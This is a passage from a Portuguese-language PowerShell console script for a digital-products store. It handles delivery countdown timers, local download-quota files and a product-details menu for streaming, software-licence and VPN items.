                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["usuario_assinatura"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_senhaassinatura = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["senha_assinatura"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["senha_assinatura"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["senha_assinatura"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["senha_assinatura"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_telapinlock = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["tela_pinlock"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                # - Links Produto
                        
                                $produtoctdigital_link_acessoplataforma = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["link_assinatura"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["link_assinatura"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["link_assinatura"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_link_codigoativacao = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["link_codigo_ativacao"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["link_codigo_ativacao"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["link_codigo_ativacao"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["link_codigo_ativacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_link_tutorial_ativacao = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["link_tutorial_ativacao"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["link_tutorial_ativacao"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["link_tutorial_ativacao"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1
                        
                                $produtoctdigital_link_tutorial_assinatura = @(
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["link_tutorial_assinatura"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["link_tutorial_assinatura"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                                $produtoctdigital_link_imagemprintconta = @(
                                    if ($null -ne $produto_digital_softwares_info) { $produto_digital_softwares_info["link_imagemprintconta"] }
                                    if ($null -ne $produto_chaveserial_softwares_info) { $produto_chaveserial_softwares_info["link_imagemprintconta"] }
                                    if ($null -ne $produto_scriptmodding_softwares_info) { $produto_scriptmodding_softwares_info["link_imagemprintconta"] }
                                    if ($null -ne $produto_digital_streaming_info) { $produto_digital_streaming_info["link_imagemprintconta"] }
                                    if ($null -ne $produto_digital_vpns_info) { $produto_digital_vpns_info["link_imagemprintconta"] }
                                ) | Where-Object { $_ -ne $null } | Select-Object -First 1

                        
                                if($produtoctdigital_tempoesperaentrega -ne "Nenhum" -or 
                                ($produtoctdigital_tempoesperaentrega -eq "Nenhum" -and $produtoctdigital_statusdisponibilidade -eq "Pendente") -or 
                                $produtoctdigital_statusdisponibilidade -eq "Pendente"){

                                    # Função para converter string em TimeSpan
                                    function ConvertTo-TimeSpan {
                                        param (
                                            [string]$timeString
                                        )
                                        # Verifica se o formato é válido (HH:mm, mm, HH)
                                        if ($timeString -match '^\d{1,2}:\d{1,2}$') {
                                            return [timespan]::Parse($timeString)
                                        } elseif ($timeString -match '^\d{1,2}$') {
                                            return [timespan]::FromMinutes([double]::Parse($timeString))

                                        } else {

                                            # Retorna um TimeSpan padrão de 30 minutos em caso de formato inválido
                                            Write-Host ""
                                            Write-Host "     Formato de tempo inválido e nenhum estado salvo encontrado. Usando valor padrão de 30 minutos." -ForegroundColor Yellow
                                            Write-Host ""
                                            Start-Sleep -Seconds 5
                                            return [timespan]::FromMinutes(30)
                                        }
                                    }

                                    try {
                                        # Converter a string para TimeSpan
                                        $produtoctdigital_tempoesperaentrega_timespan = ConvertTo-TimeSpan -timeString $produtoctdigital_tempoesperaentrega

                                        # Função para converter TimeSpan para string formatada
                                        function TimeSpanToFormattedString {
                                            param (
                                                [timespan]$timeSpan
                                            )
                                            if ($timeSpan.Hours -gt 0) {
                                                return "{0:00}h{1:00}min" -f $timeSpan.Hours, $timeSpan.Minutes
                                            } else {
                                                return "{0}min" -f $timeSpan.Minutes
                                            }
                                        }

                                        # Converter TimeSpan para string formatada
                                        $tempoespera_formatado = TimeSpanToFormattedString -timeSpan $produtoctdigital_tempoesperaentrega_timespan

                                        # Caminho para o arquivo de estado
                                        $estado_temporizador_arquivo = "C:\Users\$env:USERNAME\AppData\Local\Temp\$ProdutoSelecionado\$tempoespera_formatado\tempo_entrega_produto.txt"
                                        $pastalocal_temporizador_arquivo = "C:\Users\$env:USERNAME\AppData\Local\Temp\$ProdutoSelecionado"

                                        # Função para salvar o estado do temporizador
                                        function SalvarEstadoTemporizador {
                                            param (
                                                [timespan]$tempo_restante
                                            )

                                            # Verificar se o diretório existe
                                            if (Test-Path $pastalocal_temporizador_arquivo) {
                                                # Remover o diretório e todo o seu conteúdo
                                                Remove-Item -Recurse -Force -Path $pastalocal_temporizador_arquivo
                                                                                    # Criar diretório se não existir
                                                $diretorio = [System.IO.Path]::GetDirectoryName($estado_temporizador_arquivo)
    
                                                # Criar o diretório novamente
                                                New-Item -ItemType Directory -Path $diretorio | Out-Null

                                                # Preparar o estado do temporizador
                                                $estado = @{
                                                    TempoRestante = $tempo_restante.TotalSeconds
                                                    UltimaExecucao = (Get-Date).ToString("o")  # Salva a data e hora atual no formato ISO 8601
                                                }
    
                                                # Salvar o estado do temporizador no arquivo
                                                $estado | ConvertTo-Json | Set-Content $estado_temporizador_arquivo

                                            } else {
                                                # Criar diretório se não existir
                                                $diretorio = [System.IO.Path]::GetDirectoryName($estado_temporizador_arquivo)
    
                                                # Criar o diretório novamente
                                                New-Item -ItemType Directory -Path $diretorio | Out-Null

                                                # Preparar o estado do temporizador
                                                $estado = @{
                                                    TempoRestante = $tempo_restante.TotalSeconds
                                                    UltimaExecucao = (Get-Date).ToString("o")  # Salva a data e hora atual no formato ISO 8601
                                                }
    
                                                # Salvar o estado do temporizador no arquivo
                                                $estado | ConvertTo-Json | Set-Content $estado_temporizador_arquivo
                                            }
    
                                        }

                                        # Função para carregar o estado do temporizador
                                        function CarregarEstadoTemporizador {
                                            if (Test-Path $estado_temporizador_arquivo) {
                                                $estado = Get-Content $estado_temporizador_arquivo | ConvertFrom-Json
                                                $tempo_restante = [timespan]::FromSeconds($estado.TempoRestante)
                                                $ultima_execucao = [datetime]::Parse($estado.UltimaExecucao)
                                                $tempo_decorrido = (Get-Date) - $ultima_execucao
                                                $tempo_restante -= $tempo_decorrido
                                                return $tempo_restante
                                            } else {
                                                return $produtoctdigital_tempoesperaentrega_timespan
                                            }
                                        }

                                        # Função para mostrar o cabeçalho
                                        function MostrarCabecalhoTemporizador {
                                            Write-Host ""
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host "                                               MENU DE DETALHES DO PRODUTO                                           " -ForegroundColor Cyan
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host ""
                                        }

                                        # Função para mostrar o menu
                                        function MostrarMenuTemporizador {

                                            $nome_produto = $ProdutoSelecionado.ToUpper()
                                            $produtoctdigital_statusdisplay = if ($produtoctdigital_statusdisponibilidade -eq "Entregue") {
                                                                                    "Pendente"
                                                                              } else {
                                                                                    "$produtoctdigital_statusdisponibilidade"
                                                                              }

                                            Write-Host ""
                                            Write-Host ""
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host "      DETALHES DA ENTREGA DO $nome_produto" -ForegroundColor Cyan  
                                            Write-Host ""  
                                            Write-Host -NoNewline "      TEMPO ESPERA ENTREGA: "  -ForegroundColor White
                                            Write-Host "$produtoctdigital_tempoesperaentrega_timespan" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      STATUS DISPONIBILIDADE: "  -ForegroundColor White
                                            Write-Host "$produtoctdigital_statusdisplay" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      DISPONIBILIDADE PRODUTO: "  -ForegroundColor White
                                            Write-Host "$produtoctdigital_disponibilidadeproduto" -ForegroundColor Yellow
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host ""
                                            Write-Host -NoNewline "     [D] - "  -ForegroundColor Red
                                            Write-Host "Deslogar" -ForegroundColor Gray
                                            Write-Host -NoNewline "     [V] - "  -ForegroundColor Cyan
                                            Write-Host "Voltar" -ForegroundColor Gray
                                            Write-Host -NoNewline "     [M] - "  -ForegroundColor Yellow
                                            Write-Host "Menu Principal" -ForegroundColor Gray
                                            Write-Host ""
                                            Write-Host "     ================================================================================================================" -ForegroundColor Green
                                            Write-Host ""
                                            Write-Host "Pressione a tecla de sua opção desejada:" -ForegroundColor White
                                        }

                                        # Função principal para mostrar o tempo restante
                                        function MostrarTempoRestante {
                                            param (
                                                [timespan]$tempo_restante
                                            )
                                            $horas_restantes = [math]::Floor($tempo_restante.TotalHours)
                                            $minutos_restantes = $tempo_restante.Minutes
                                            $segundos_restantes = $tempo_restante.Seconds

                                            Write-Host -NoNewline "      TEMPO RESTANTE PARA ENTREGA: "  -ForegroundColor White
                                            Write-Host -NoNewline "$horas_restantes" -ForegroundColor White
                                            Write-Host -NoNewline " Horas" -ForegroundColor Yellow
                                            Write-Host -NoNewline " /" -ForegroundColor Cyan
                                            Write-Host -NoNewline " $minutos_restantes" -ForegroundColor White
                                            Write-Host -NoNewline " Minutos" -ForegroundColor Yellow
                                            Write-Host -NoNewline " /" -ForegroundColor Cyan
                                            Write-Host -NoNewline " $segundos_restantes" -ForegroundColor White
                                            Write-Host -NoNewline " Segundos" -ForegroundColor Yellow
                                            Write-Host ""
                                        }

                                        # Função principal
                                        function MainTemporizador {

                                            # Carregar o estado do temporizador
                                            $tempo_restante = CarregarEstadoTemporizador

                                            # Mostrar o menu inicial
                                            Clear-Host
                                            MostrarCabecalhoTemporizador

                                            # Salvar a posição do cursor para o temporizador
                                            $posicao_temporizador = $Host.UI.RawUI.CursorPosition

                                            # Mostrar o menu abaixo do temporizador
                                            MostrarMenuTemporizador

                                            # Salvar a posição inicial do cursor
                                            $posicao_inicial = $Host.UI.RawUI.CursorPosition

                                            # Loop principal para detecção de entrada do usuário e atualização do temporizador
                                            while ($tempo_restante.TotalSeconds -gt 0) {

                                                # Restaurar a posição do cursor para o temporizador
                                                $Host.UI.RawUI.CursorPosition = $posicao_temporizador
                                                MostrarTempoRestante -tempo_restante $tempo_restante

                                                # Restaurar a posição inicial do cursor para o menu
                                                $Host.UI.RawUI.CursorPosition = $posicao_inicial

                                                if ($Host.UI.RawUI.KeyAvailable) {
                                                    $input = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
                                                    switch ($input) {
                                                        'D' {
                                                            Fazer-Login
                                                        }
                                                        'V' {
                                                            Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                                                        }
                                                        'M' {
                                                            Show-Menu
                                                        }
                                                        default {
                                                            Write-Host "Opção inválida."
                                                        }
                                                    }
                                                }

                                                # Esperar 1 segundo
                                                Start-Sleep -Seconds 1
                                                $tempo_restante = $tempo_restante - (New-TimeSpan -Seconds 1)
                                                SalvarEstadoTemporizador -tempo_restante $tempo_restante
                                            }

                                            # Remover o diretório de estado ao terminar o temporizador
                                            $diretorio = [System.IO.Path]::GetDirectoryName($estado_temporizador_arquivo)
                                            if (Test-Path $diretorio) {
                                                Remove-Item -Path $diretorio -Recurse -Force

                                                # Mostrar o menu inicial
                                                Clear-Host
                                                MostrarCabecalhoTemporizador
                                                Write-Host ""
                                                Write-Host "      O prazo do tempo de entrega chegou ao fim!"  -ForegroundColor Green
                                                Write-Host ""
                                                Write-Host -NoNewline "       * " -ForegroundColor Cyan
                                                Write-Host "Volte e selecione novamente o método de ativação do seu $ProdutoSelecionado." -ForegroundColor Yellow
                                                Write-Host -NoNewline "       * " -ForegroundColor Cyan
                                                Write-Host "Ou faça o login em sua conta novamente." -ForegroundColor Yellow
                                                Write-Host ""
                                                Write-Host "      O temporizador pode reiniciar, se o produto ainda não estiver disponível para entrega."  -ForegroundColor Red
                                                # Mostrar o menu abaixo do temporizador
                                                MostrarMenuTemporizador

                                                # Loop principal para detecção de entrada do usuário e atualização do temporizador
                                                while ($tempo_restante.TotalSeconds -eq 0) {

                                                    if ($Host.UI.RawUI.KeyAvailable) {
                                                        $input = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").Character
                                                        switch ($input) {
                                                            'D' {
                                                                Fazer-Login
                                                
                                                            }
                                                            'V' {
                                                                Show-Produtos-Metodos -UsuarioAtual $usuario_atual -SenhaAtual $senha_atual -CategoriaEscolhida $CategoriaEscolhida -ProdutoSelecionado $produtoSelecionado -TipoPlanoConta $TipoPlanoConta -DataAtual $DataAtual -DataTermino $DataTermino -ProdutosMetodoLiberado $ProdutosMetodoLiberado
                                                
                                                            }
                                                            'M' {
                                                                Show-Menu
                                                
                                                            }
                                                            default {
                                                                Write-Host "Opção inválida."
                                                            }
                                                        }
                                                    }
                                                }
                                            } 
                                        }

                                        # Executar a função principal
                                        MainTemporizador

                                    } catch {
                                        Write-Host ""
                                        Write-Host "     Ocorreu um erro: $_" -ForegroundColor Red
                                        Write-Host "     Por favor, tente novamente." -ForegroundColor Yellow
                                        Write-Host ""
                                    }
                                } elseif($produtoctdigital_tempoesperaentrega -eq "Nenhum" -and $produtoctdigital_statusdisponibilidade -eq "Entregue") {
                                    
                                    function Replace-InvalidCharacters {

                                        param (
                                            [string]$inputString
                                        )

                                        return $inputString -replace '[\\/:"*?<>|]', '_'
                                    }

                                    $metodo_atual_formatado = Replace-InvalidCharacters -inputString $produtoctdigitalDisponivel['metodo_ativacao_produto']

                                    # Definir o caminho do arquivo de quantidade com base no nome do usuário
                                    $qtdvFilePathIndividual = "C:\Users\$env:USERNAME\AppData\Local\Temp\$usuario_atual\$($produtoctdigitalDisponivel['nome_produto'])\$metodo_atual_formatado\qtdv_quantidade.txt"

                                    # Criar diretório individual se não existir
                                    $directoryPathIndividual = [System.IO.Path]::GetDirectoryName($qtdvFilePathIndividual)
                 
                                    if (-not (Test-Path -Path $directoryPathIndividual)) { 
                                        New-Item -ItemType Directory -Path $directoryPathIndividual > $null
                                    }

                                    # Função para calcular o total de qtdv do produto cadastro na conta do usuário
                                    function Calculate-QTDVIndividual {
                                        param (
                                            [array]$products
                                        )

                                        $qtdv_individual = $produtoctdigitalDisponivel['qtdv_produto_atualizado']

                                        if ($qtdv_individual -eq "Ilimitado") {
                                            return "Ilimitado"
                                        } else {
                                            return [int]$qtdv_individual
                                        }
                                    }

                                    # Função para salvar valores de qtdv individual do produto cadastrado
                                    function Save-QTDVIndividualValues {
                                        param (
                                            [hashtable]$qtdvIndividualValues
                                        )

                                        $contentqtdvIndividual = @()
                                        foreach ($key in $qtdvIndividualValues.Keys) {
                                            $contentqtdvIndividual += "$($key): $($qtdvIndividualValues[$key])"
                                        }

                                        # Se existir, atualiza o conteúdo do arquivo
                                        $contentqtdvIndividual | Set-Content $qtdvFilePathIndividual -Force
                                    }
                                    
                                    # Função para carregar valores de qtdv individual do produto do usuário
                                    function Load-QTDVIndividualValues {
                                        if (Test-Path $qtdvFilePathIndividual) {
                                            $contentIndividual = Get-Content $qtdvFilePathIndividual -Raw
                                            $qtdvIndividualValues = @{}
                                            foreach ($line in $contentIndividual -split "`n") {
                                                $parts = $line -split ":"
                                                if ($parts.Length -eq 2) {
                                                    if ($parts[1].Trim() -eq "Ilimitado") {
                                                        $qtdvIndividualValues[$parts[0].Trim()] = $parts[1].Trim()
                                                    } else {
                                                        $qtdvIndividualValues[$parts[0].Trim()] = [int]$parts[1].Trim()
                                                    }
                                                }
                                            }

                                            # Calcula a soma total do qtdv_valor_atual do produto do usuário
                                            $qtdvIndividualTotal = Calculate-QTDVIndividual -products $produtosctdigitalDisponiveis
                                            # Atualizar QTDV total
                                            $qtdvValues = Load-QTDVValues
                                            $statusPagamentoTxt = $qtdvValues["status_pagamento"]

                                            # Se qtdv_valor_atual for 0 ou não existir, ajusta com base nos valores
                                            if (-not $qtdvIndividualValues.ContainsKey("qtdv_valor_atual") -or $qtdvIndividualValues["qtdv_valor_atual"] -eq 0 -and $produtoctdigitalDisponivel['status_pagamento'] -eq "Aprovado" -and $qtdvIndividualValues["qtdv_valor_inicial"] -eq $qtdvIndividualTotal) {
                                                
                                                $qtdvIndividualValues["qtdv_valor_atual"] = 0

                                            } elseif($qtdvIndividualTotal -ne "Ilimitado" -and $qtdvIndividualValues["qtdv_valor_atual"] -eq 0 -and $statusPagamentoTxt -eq "Aprovado" -and $produtoctdigitalDisponivel['status_pagamento'] -eq "Pendente" -and ($qtdvIndividualValues["qtdv_valor_inicial"] -eq $qtdvIndividualTotal -or $qtdvIndividualValues["qtdv_valor_inicial"] -gt $qtdvIndividualTotal -or $qtdvIndividualValues["qtdv_valor_inicial"] -lt $qtdvIndividualTotal)) {

                                                # Atualiza qtdv_valor_inicial com o valor total calculado
                                                $qtdvIndividualValues["qtdv_valor_inicial"] = $qtdvIndividualTotal
                                                # Atualiza qtdv_valor_atual com o resultado da redução utilizada do qtdv anteriormente
                                                $qtdvIndividualValues["qtdv_valor_atual"] = $qtdvIndividualTotal

                                                # Salva os valores atualizados no arquivo
                                                Save-QTDVIndividualValues -qtdvIndividualValues $qtdvIndividualValues

                                            } elseif($qtdvIndividualTotal -ne "Ilimitado" -and $statusPagamentoTxt -eq "Aprovado" -or $produtoctdigitalDisponivel['status_pagamento'] -eq "Aprovado" -and $qtdvIndividualValues["qtdv_valor_inicial"] -ne $qtdvIndividualTotal) {
                                                
                                                # Calculo da redução para o valor atual atualizado
                                                $reduceIndividualValorInicial = $qtdvIndividualValues["qtdv_valor_inicial"] - $qtdvIndividualValues["qtdv_valor_atual"]

                                                # Atualiza qtdv_valor_inicial com o valor total calculado
                                                $qtdvIndividualValues["qtdv_valor_inicial"] = $qtdvIndividualTotal
                                                # Atualiza qtdv_valor_atual com o resultado da redução utilizada do qtdv anteriormente
                                                $qtdvIndividualValues["qtdv_valor_atual"] = $qtdvIndividualValues["qtdv_valor_inicial"] - $reduceIndividualValorInicial
                                                
                                                # Salva os valores atualizados no arquivo
                                                Save-QTDVIndividualValues -qtdvIndividualValues $qtdvIndividualValues
                                            }

                                            return $qtdvIndividualValues


                                        } else {

                                            # Se o arquivo não existir, retorna o valor de qtdv_valor_atual do produto do usuário
                                            $qtdvIndividualTotal = Calculate-QTDVIndividual -products $produtosctdigitalDisponiveis
                                            
                                            $defaultIndividualValues = @{ "qtdv_valor_inicial" = $qtdvIndividualTotal; "qtdv_valor_atual" = $qtdvIndividualTotal }
                                            Save-QTDVIndividualValues -qtdvIndividualValues $defaultIndividualValues
                                            
                                            return $defaultIndividualValues
                                        }
                                    }

                                    # Função para atualizar qtdv no menu
                                    function Update-QTDVIndividualMenu {

                                        param (
                                            [string]$qtdvIndividualTotal,
                                            [switch]$silent
                                        )

                                        if(-not $silent) {
                                            
                                            Write-Host -NoNewline "      QTD DOWNLOAD E VISUALIZAÇÕES: "
                                            
                                            if ($qtdvIndividualTotal -eq "Ilimitado") {
                                                Write-Host "$qtdvIndividualTotal" -ForegroundColor Cyan
                                            } elseif($qtdvIndividualTotal -ne 0) {
                                                Write-Host "$qtdvIndividualTotal" -ForegroundColor Yellow
                                            } else {
                                                Write-Host "Nenhum" -ForegroundColor Red
                                            }

                                        }
                                    }

                                    # Função para selecionar uma opção no menu
                                    function QTDV-Individual-Select-MenuOption {
                                        param (
                                            [string]$option,
                                            [hashtable]$qtdvIndividualValues
                                        )

                                        if ($option -eq "1" -or $option -eq "3" -and $qtdvIndividualValues["qtdv_valor_atual"] -gt 0) {

                                            $qtdvValues = Load-QTDVValues

                                            if ($qtdvIndividualValues["qtdv_valor_atual"] -eq 1) {
                                                # Atualizar status de pagamento se qtdv_valor_atual for 1
                                                $qtdvValues["status_pagamento"] = "Pendente"
                                            }

                                            # Atualizar QTDV individual
                                            $qtdvIndividualValues["qtdv_valor_atual"] -= 1
                                            Save-QTDVIndividualValues -qtdvIndividualValues $qtdvIndividualValues

                                            # Atualizar QTDV total
                                            $qtdvValues["qtdv_valor_atual"] -= 1
                                            $qtdvValues["qtdv_valor_utilizado"] = $qtdvValues["qtdv_valor_inicial"] - $qtdvValues["qtdv_valor_atual"]
                                            Save-QTDVValues -qtdvValues $qtdvValues

                                            # Criar um objeto para retornar ambos os valores
                                            $result = @{
                                                Individual = $qtdvIndividualValues
                                                Total = $qtdvValues
                                            }

                                            return $result
                                        } else {
                                            return $null
                                        }
                                    }


                                    # Calcular a soma total de qtdv do produto cadastro na conta do usuário
                                    $qtdvIndividualTotal = Calculate-QTDVIndividual -products $produtosctdigitalDisponiveis

                                    # Carregar valores de qtdv
                                    $qtdvIndividualValues = Load-QTDVIndividualValues

                                    # Atualizar qtdv_valor_inicial do produto do usuário se necessário
                                    if ($qtdvIndividualValues["qtdv_valor_inicial"] -ne $qtdvIndividualTotal) {

                                        $qtdvIndividualValues["qtdv_valor_inicial"] = $qtdvIndividualTotal
                                        
                                        if ($qtdvIndividualValues["qtdv_valor_atual"] -eq 0) {

                                            $qtdvIndividualValues["qtdv_valor_atual"] = $qtdvIndividualTotal

                                        }
                                    }

                                    $beneficios_array = $produtoctdigital_beneficios -split ":"
                                    $regrasuso_array = $produtoctdigital_regrasuso -split ":"
                                    $instrucoes_usoativacao_array = $produtoctdigital_instrucoes_usoativacao -split ":"

                                    $contadorbeneficios = 1
                                    $contadorregras = 1
                                    $contadorinstrucoesatv = 1

                                    function ExibirMenuProduto {

                                        param (
                                            [string]$produtoctdigital_usuariodisplay = "xxxx-xxxx-xxxx", 
                                            [string]$produtoctdigital_senhadisplay = "xxxx-xxxx-xxxx",
                                            [string]$produtoctdigital_telapinlockdisplay = "xxxx-xxxx-xxxx",
                                            [string]$produtoctdigital_chavekeysdisplay = "xxxx-xxxx-xxxx",
                                            [string]$revelarDadosAcessoColor = "Yellow",
                                            [string]$tituloDadosAcessoColor = "Cyan"
                                        )

                                        cls
                                        Write-Host ""
                                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                                        Write-Host "                                               MENU DE DETALHES DO PRODUTO                                           " -ForegroundColor Cyan
                                        Write-Host "     ================================================================================================================" -ForegroundColor Green
                                        Write-Host ""
                                        Write-Host "      DETALHES DO PRODUTO: " -ForegroundColor Cyan
                                        Write-Host ""
                                        Write-Host -NoNewline "      NOME DO PRODUTO: "
                                        Write-Host "$($produtoctdigitalDisponivel['nome_produto'])" -ForegroundColor Yellow
                                        Write-Host -NoNewline "      CATEGORIA DO PRODUTO: "
                                        Write-Host "$($produtoctdigitalDisponivel['categoria_produto'])" -ForegroundColor Yellow
                                        Write-Host -NoNewline "      MÉTODO DE ATIVAÇÃO: "
                                        Write-Host "$($produtoctdigitalDisponivel['metodo_ativacao_produto'])" -ForegroundColor Yellow
                                        if ($CategoriaEscolhida -eq "Streaming") {
                                            Write-Host -NoNewline "      TIPO CONTA: "
                                            Write-Host "$produtoctdigital_tipo_conta" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QUANTIDADE DE TELAS: "
                                            Write-Host "$produtoctdigital_qtd_telas" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO DISP. SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessdisp_simult" -ForegroundColor Yellow
                                        } elseif($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Conta Digital") {
                                            Write-Host -NoNewline "      TIPO CONTA: "
                                            Write-Host "$produtoctdigital_tipo_conta" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      ANO PRODUTO: "
                                            Write-Host "$produtoctdigital_ano_produto" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO ATUAL: "
                                            Write-Host "$produtoctdigital_versao_atual" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO DISPONÍVEL: "
                                            Write-Host "$produtoctdigital_versao_disponivel" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      SISTEMA OPERACIONAL: "
                                            Write-Host "$produtoctdigital_sistema_operacional" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      CAPACIDADE ARMAZENAMENTO: "
                                            Write-Host "$produtoctdigital_capacidade_armazenamento" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO USUÁRIOS SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessusuarios_simult" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO DISP. SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessdisp_simult" -ForegroundColor Yellow
                                        } elseif($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Chave/Serial") {
                                            Write-Host -NoNewline "      TIPO CONTA: "
                                            Write-Host "$produtoctdigital_tipo_conta" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      ANO PRODUTO: "
                                            Write-Host "$produtoctdigital_ano_produto" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO ATUAL: "
                                            Write-Host "$produtoctdigital_versao_atual" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO DISPONÍVEL: "
                                            Write-Host "$produtoctdigital_versao_disponivel" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      SISTEMA OPERACIONAL: "
                                            Write-Host "$produtoctdigital_sistema_operacional" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      CAPACIDADE ARMAZENAMENTO: "
                                            Write-Host "$produtoctdigital_capacidade_armazenamento" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO USUÁRIOS SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessusuarios_simult" -ForegroundColor Yellow
                                        } elseif($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Pré-Ativado") {
                                            Write-Host -NoNewline "      ANO PRODUTO: "
                                            Write-Host "$produtoctdigital_ano_produto" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO ATUAL: "
                                            Write-Host "$produtoctdigital_versao_atual" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      VERSÃO DISPONÍVEL: "
                                            Write-Host "$produtoctdigital_versao_disponivel" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      SISTEMA OPERACIONAL: "
                                            Write-Host "$produtoctdigital_sistema_operacional" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD INSTALAÇÕES DISP. SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_installdisp_simult" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO DISP. SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessdisp_simult" -ForegroundColor Yellow
                                        } elseif($CategoriaEscolhida -eq "VPNs") {
                                            Write-Host -NoNewline "      TIPO CONTA: "
                                            Write-Host "$produtoctdigital_tipo_conta" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      SISTEMA OPERACIONAL: "
                                            Write-Host "$produtoctdigital_sistema_operacional" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO USUÁRIOS SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessusuarios_simult" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      QTD ACESSO DISP. SIMULTÂNEOS: "
                                            Write-Host "$produtoctdigital_qtd_acessdisp_simult" -ForegroundColor Yellow
                                        }
                                        Write-Host -NoNewline "      COMPATIBILIDADE DISPOSITIVOS: "
                                        Write-Host "$produtoctdigital_compatibilidade_dispositivos" -ForegroundColor Yellow
                                        if ($CategoriaEscolhida -eq "Softwares e Licenças" -and $MetodoSelecionado -eq "Pré-Ativado") {
                                            Write-Host -NoNewline "      DURAÇÃO GARANTIA SUPORTE: "
                                            Write-Host "$produtoctdigital_duracao_garantia_suporte" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                            Write-Host "$($produtoctdigitalDisponivel['status_pagamento'])" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      STATUS ATUALIZAÇÃO/RENOVAÇÃO: "
                                            Write-Host "$produtoctdigital_status_atualizacao_renovacao" -ForegroundColor Yellow
                                            # Write-Host "$($produtoctdigitalDisponivel['qtdv_produto'])" -ForegroundColor Yellow
                                            Update-QTDVIndividualMenu -qtdvIndividualTotal $qtdvIndividualValues["qtdv_valor_atual"]
                                        } else {
                                            Write-Host -NoNewline "      DIAS GARANTIA SUPORTE: "
                                            Write-Host "$produtoctdigital_dias_garantia_suporte" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      STATUS PAGAMENTO: "
                                            Write-Host "$($produtoctdigitalDisponivel['status_pagamento'])" -ForegroundColor Yellow
                                            Write-Host -NoNewline "      STATUS RENOVAÇÃO: "
                                            Write-Host "$produtoctdigital_status_renovacao" -ForegroundColor Yellow
